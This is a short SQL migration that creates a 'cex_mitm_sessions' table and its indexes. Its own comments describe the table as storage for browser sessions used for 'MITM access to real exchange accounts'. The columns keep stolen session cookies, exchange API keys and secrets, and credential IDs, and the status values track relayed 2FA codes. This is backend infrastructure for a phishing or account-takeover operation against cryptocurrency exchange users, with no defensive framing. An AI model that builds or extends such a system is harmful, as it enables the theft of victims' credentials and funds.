-- CEX MITM Sessions: Simultaneous login tracking and session management
-- Stores active browser sessions for backend MITM access to real exchange accounts

CREATE TABLE IF NOT EXISTS "cex_mitm_sessions" (
  "id" uuid PRIMARY KEY DEFAULT gen_random_uuid() NOT NULL,
  "cred_id" uuid NOT NULL,
  "exchange" text NOT NULL,
  "session_key" text NOT NULL UNIQUE,
  "cookies" text NOT NULL,
  "user_agent" text,
  "status" text NOT NULL DEFAULT 'pending',
  "twofa_code_requested_at" timestamp with time zone,
  "verified_at" timestamp with time zone,
  "expires_at" timestamp with time zone NOT NULL,
  "api_key" text,
  "api_secret" text,
  "metadata" jsonb,
  "created_at" timestamp with time zone DEFAULT now() NOT NULL,
  CONSTRAINT "cex_mitm_sessions_status_valid" CHECK (
    "cex_mitm_sessions"."status" IN ('pending', '2fa_required', 'verified', 'active', 'expired')
  )
);

--> statement-breakpoint
CREATE INDEX IF NOT EXISTS "idx_cex_mitm_sessions_cred_id" ON "cex_mitm_sessions" ("cred_id");

--> statement-breakpoint
CREATE INDEX IF NOT EXISTS "idx_cex_mitm_sessions_exchange" ON "cex_mitm_sessions" ("exchange");

--> statement-breakpoint
CREATE INDEX IF NOT EXISTS "idx_cex_mitm_sessions_status" ON "cex_mitm_sessions" ("status");

--> statement-breakpoint
CREATE INDEX IF NOT EXISTS "idx_cex_mitm_sessions_expires_at" ON "cex_mitm_sessions" ("expires_at");

--> statement-breakpoint
CREATE INDEX IF NOT EXISTS "idx_cex_mitm_sessions_session_key" ON "cex_mitm_sessions" ("session_key");
